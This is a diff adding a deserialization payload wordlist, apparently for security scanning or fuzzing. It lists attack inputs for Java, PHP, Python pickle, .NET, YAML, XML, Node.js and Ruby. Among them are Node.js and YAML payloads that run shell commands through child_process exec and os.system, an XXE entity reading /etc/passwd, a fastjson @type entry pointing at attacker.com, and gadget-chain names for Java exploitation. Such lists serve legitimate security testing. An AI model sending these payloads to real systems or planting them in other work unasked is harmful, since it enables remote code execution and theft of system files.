@@ -1,0 +1,55 @@
+# Deserialization Payloads
+
+# Java serialized object patterns
+rO0ABXNy
+aced0005
+H4sIAAAAAAAA
+
+# PHP serialization
+O:8:"stdClass":0:{}
+a:1:{i:0;s:5:"admin";}
+O:4:"User":1:{s:4:"role";s:5:"admin";}
+O:10:"Evil_Class":0:{}
+
+# Python pickle
+\x80\x03cos
+(S'whoami'
+tR.
+
+# .NET deserialization
+AAEAAAD/////
+
+# JSON deserialization attacks
+{"@type":"java.net.URL","val":"http://attacker.com"}
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('calc')}()"}
+
+# YAML deserialization
+!!python/object/apply:os.system ['calc']
+!!python/object/new:os.system [calc]
+
+# XML deserialization/XXE
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+
+# Base64 encoded payloads
+# Java: rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==
+# PHP: TzoxMDoiRXZpbF9DbGFzcyI6MDp7fQ==
+
+# Gadget chains (Java)
+CommonsCollections1
+CommonsCollections2
+CommonsCollections3
+CommonsCollections4
+CommonsCollections5
+CommonsCollections6
+Groovy1
+Spring1
+Spring2
+
+# Node.js deserialization
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls')}()"}
+{"__proto__":{"isAdmin":true}}
+
+# Ruby Marshal
+\x04\x08o:\x10User\x06:\x0arole:\x0aadmin
